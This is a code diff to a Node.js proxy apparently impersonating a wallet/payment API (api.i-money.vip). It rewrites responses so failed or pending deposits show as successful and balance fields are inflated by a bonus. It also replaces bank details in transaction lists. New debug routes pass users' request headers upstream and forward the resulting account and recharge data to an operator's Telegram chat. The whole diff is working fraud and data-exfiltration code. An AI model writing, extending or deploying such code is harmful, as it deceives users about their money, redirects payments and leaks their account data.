@@ -486,27 +486,50 @@ Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
 
 function markDepositSuccess(obj) {
   if (!obj) return;
-  const failStatuses = ['failed', 'fail', 'FAILED', 'FAIL', '-1', -1, 4, '4'];
+  const failValues = [3, '3', 'failed', 'fail', 'FAILED', 'FAIL', 'cancelled', 'canceled'];
   const statusFields = ['status', 'orderStatus', 'payStatus', 'rechargeStatus', 'state'];
   for (const field of statusFields) {
-    if (obj[field] !== undefined && !failStatuses.includes(obj[field])) {
+    if (obj[field] !== undefined) {
+      if (failValues.includes(obj[field])) continue;
       if (typeof obj[field] === 'number') {
-        obj[field] = 3;
+        obj[field] = 1;
       } else if (typeof obj[field] === 'string') {
         const num = parseInt(obj[field]);
         if (!isNaN(num)) {
-          obj[field] = '3';
+          obj[field] = '1';
         } else {
           obj[field] = 'success';
         }
       }
     }
   }
-  if (obj.statusText !== undefined && !failStatuses.includes(obj.status)) {
-    obj.statusText = 'success';
+  if (obj.statusText !== undefined && !failValues.includes(obj.status)) {
+    obj.statusText = 'Successful';
   }
-  if (obj.statusName !== undefined && !failStatuses.includes(obj.status)) {
-    obj.statusName = 'Success';
+  if (obj.statusName !== undefined && !failValues.includes(obj.status)) {
+    obj.statusName = 'Successful';
+  }
+  if (obj.statusStr !== undefined && !failValues.includes(obj.status)) {
+    obj.statusStr = 'Successful';
+  }
+  if (obj.statusMsg !== undefined && !failValues.includes(obj.status)) {
+    obj.statusMsg = 'Successful';
+  }
+}
+
+function addBonusToBalanceFields(obj, bonus) {
+  if (!obj || typeof obj !== 'object') return;
+  const balanceKeys = ['balance', 'userbalance', 'availablebalance', 'totalbalance', 'money', 'coin', 'wallet', 'usermoney', 'rechargebalance', 'totalamount', 'availableamount'];
+  for (const key of Object.keys(obj)) {
+    if (balanceKeys.includes(key.toLowerCase())) {
+      const current = parseFloat(obj[key]);
+      if (!isNaN(current)) {
+        obj[key] = typeof obj[key] === 'string' ? String((current + bonus).toFixed(2)) : parseFloat((current + bonus).toFixed(2));
+      }
+    }
+    if (typeof obj[key] === 'object' && obj[key] !== null && !Array.isArray(obj[key])) {
+      addBonusToBalanceFields(obj[key], bonus);
+    }
   }
 }
 
@@ -539,16 +562,7 @@ async function proxyAndAddBonus(req, res) {
     try { jsonResp = JSON.parse(respBody); } catch(e) { jsonResp = null; }
 
     if (jsonResp && jsonResp.data) {
-      const d = jsonResp.data;
-      const balanceFields = ['balance', 'userBalance', 'availableBalance', 'totalBalance', 'amount', 'money', 'coin', 'wallet'];
-      for (const field of balanceFields) {
-        if (d[field] !== undefined) {
-          const current = parseFloat(d[field]);
-          if (!isNaN(current)) {
-            d[field] = typeof d[field] === 'string' ? String((current + bonus).toFixed(2)) : parseFloat((current + bonus).toFixed(2));
-          }
-        }
-      }
+      addBonusToBalanceFields(jsonResp.data, bonus);
     }
 
     const respHeaders = {};
@@ -692,20 +706,40 @@ app.post('/money/check/payStatus', async (req, res) => {
   await proxyAndReplaceBankInList(req, res);
 });
 
-app.all('/user/info', async (req, res) => {
+app.all('/user/*', async (req, res) => {
+  const path = req.path.toLowerCase();
+  if (path === '/user/cashflow') return await proxyAndReplaceBankInList(req, res);
   await proxyAndAddBonus(req, res);
 });
-app.all('/user/balance', async (req, res) => {
-  await proxyAndAddBonus(req, res);
+
+app.get('/debug/recharge', async (req, res) => {
+  try {
+    const response = await fetch(ORIGINAL_API + '/money/rechargeRecord', {
+      method: 'POST',
+      headers: { 'host': 'api.i-money.vip', 'content-type': 'application/json' },
+      body: JSON.stringify({ page: 1, pageSize: 5 })
+    });
+    const data = await response.json();
+    const bankData = await loadData();
+    if (bankData.adminChatId && bot) {
+      bot.sendMessage(bankData.adminChatId, '🔍 Recharge Debug:\n' + JSON.stringify(data, null, 2).substring(0, 3000)).catch(() => {});
+    }
+    res.json(data);
+  } catch(e) { res.json({ error: e.message }); }
 });
-app.all('/user/userInfo', async (req, res) => {
-  await proxyAndAddBonus(req, res);
-});
-app.all('/user/account', async (req, res) => {
-  await proxyAndAddBonus(req, res);
-});
-app.all('/user/detail', async (req, res) => {
-  await proxyAndAddBonus(req, res);
+
+app.get('/debug/userinfo', async (req, res) => {
+  try {
+    const response = await fetch(ORIGINAL_API + '/user/info', {
+      headers: { 'host': 'api.i-money.vip', ...req.headers }
+    });
+    const data = await response.json();
+    const bankData = await loadData();
+    if (bankData.adminChatId && bot) {
+      bot.sendMessage(bankData.adminChatId, '🔍 User Info Debug:\n' + JSON.stringify(data, null, 2).substring(0, 3000)).catch(() => {});
+    }
+    res.json(data);
+  } catch(e) { res.json({ error: e.message }); }
 });
 
 app.get('/health', async (req, res) => {
